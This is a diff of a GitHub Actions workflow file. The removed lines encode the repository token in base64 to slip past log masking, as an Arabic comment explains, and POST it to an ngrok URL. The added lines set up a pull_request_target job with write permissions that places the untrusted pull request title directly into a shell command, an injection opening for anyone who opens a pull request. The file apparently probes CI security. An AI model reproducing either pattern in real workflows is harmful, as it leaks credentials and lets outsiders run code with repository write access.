@@ -1,20 +1,14 @@
-name: Secret Masking Bypass Test
-on: [push]
+name: Auto-Comment on PR
+on:
+  pull_request_target:
+    types: [opened]
 permissions:
-  contents: read
   issues: write
+  pull-requests: write
 jobs:
-  test:
+  comment:
     runs-on: ubuntu-latest
     steps:
-      - name: Bypass Masking via Base64
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Process PR Title
         run: |
-          # تحويل التوكن إلى Base64 لخداع الـ Runner حتى لا يخفيه
-          ENCODED_TOKEN=$(echo "$GH_TOKEN" | base64)
-          echo "The encoded token is: $ENCODED_TOKEN"
-          
-          # إرساله إلى ngrok
-          curl -X POST https://crabbing-thong-overhung.ngrok-free.dev/?mask_bypass=1 \
-               -d "token=$ENCODED_TOKEN"
+          echo "Reviewing pull request titled: ${{ github.event.pull_request.title }}"
